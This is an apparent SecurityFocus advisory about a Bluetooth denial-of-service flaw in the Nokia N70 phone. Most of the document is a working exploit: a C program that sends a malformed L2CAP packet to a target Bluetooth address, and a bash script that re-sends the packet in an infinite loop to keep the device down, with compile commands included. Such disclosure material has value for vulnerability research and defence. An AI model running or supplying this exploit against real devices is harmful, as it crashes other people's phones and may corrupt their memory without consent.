source: https://www.securityfocus.com/bid/16666/info

Nokia N70 is reportedly prone to a remote denial-of-service vulnerability.

A successful attack can allow an attacker to corrupt memory and to trigger a denial-of-service condition. Arbitrary code execution may be possible as well, but this has not been confirmed.

Nokia model N70 is reported vulnerable to this issue; the specific firmware is currently unknown.

This issue is reported to be a seperate issue than 16513 (Nokia N70 Remote Denial of Service Vulnerability) also discovered using the BSS Stack Smasher.

-------------------------------------replay_l2cap_packet_nokiaN70.c-------------------------------------

/*
        This is a TEMPLATE used by bss, if you change this all replays
	will be generated with this code
*/

/*	BSS Replay packet template 				*/
/* 	Pierre BETOUIN <pierre.betouin@infratech.fr>	*/
/*      Ollie Whitehouse < ol at uncon dot org                  */


/* Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@infratech.fr>
 * Download on http://www.secuobs.com/replay_l2cap_packet_nokiaN70.c
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#include "../l2ping.h"

#define SIZE	7

char *replay_buggy_packet="\x7D\xAF\x00\x00\x41\x41\x41";

int main(int argc, char **argv)
{
	struct sockaddr_l2 addr;
	int sock, sent, i;
	    
	if(argc < 2)
	{
		fprintf(stderr, "[!] Usage: %s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("[!] Couldn't create socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;

	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		perror("[!] Couldn't bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &addr.l2_bdaddr);
	
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
	{
		perror("[!] Couldn't connect");
		exit(EXIT_FAILURE);
	}
	
	if( (sent=send(sock, replay_buggy_packet, SIZE, 0)) >= 0)
	{
		printf("[*] L2CAP packet sent (%d) bytes\n", sent);
	}

	if(!l2ping(argv[1],0,0)){
		fprintf(stdout, "[!] replay: l2ping returned that the host is down!\n");
	}else{          
	        fprintf(stdout, "[*] replay: l2ping returned that the host is up!\n");
	}
	   
	printf("[i] Buffer:\t");
	for(i=0; i<sent; i++)
		printf("%.2X ", (unsigned char) replay_buggy_packet[i]);
	printf("\n");

	close(sock);
	return EXIT_SUCCESS;
}

--------------------------------------------loop.sh-------------------------------------------

#!/bin/bash
# Another Nokia N70 Bluetooth remote Denial of Service
# Pierre BETOUIN pierre.betouin@infratech.fr
# Feb 14 11:21:58 GMT+1 2006

echo "Another Nokia N70 Bluetooth remote Denial of Service"
echo "Pierre BETOUIN pierre.betouin@infratech.fr"
echo ""
if (( $# < 1 )); then
echo "Usage: $0 <btdaddr> (uses replay_l2cap_packet_nokiaN70)"
exit
fi

if [ -x ./replay_l2cap_packet_nokiaN70 ]; then
echo "Kill this prog with \"killall -9 loop.sh\" in another terminal."
echo "PRESS ENTER TO LAUNCH THE DoS (or Ctrl-c to exit now)"
echo ""
read
while (( 1 )); do # Infinite loop, a bit dirty, we must say ;)
./replay_l2cap_packet_nokiaN70 $1
done
else
echo "You must compile replay_l2cap_packet_nokiaN70 before"
echo "gcc -lbluetooth -o replay_l2cap_packet_nokiaN70 replay_l2cap_packet_nokiaN70.c"
exit

fi